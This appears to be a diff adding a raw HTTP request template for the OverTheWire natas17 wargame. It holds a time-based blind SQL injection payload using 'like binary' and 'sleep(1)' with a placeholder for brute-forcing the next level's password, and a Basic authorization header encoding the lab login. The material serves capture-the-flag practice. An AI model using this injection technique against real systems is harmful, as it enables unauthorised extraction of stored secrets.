@@ -1,0 +1,14 @@
+POST /index.php HTTP/1.1
+Host: natas17.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas17.natas.labs.overthewire.org/
+Cookie: __cfduid=d861fc1b6c46e687e61e35690b5f416611520867281; __utma=176859643.1818706855.1520867282.1520867282.1520867282.1; __utmb=176859643.2.10.1520867282; __utmc=176859643; __utmz=176859643.1520867282.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1
+Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+
+username=natas18%22+and+password+like+binary+%27$$PAYLOAD$$%25%27+and+sleep%281%29+%23
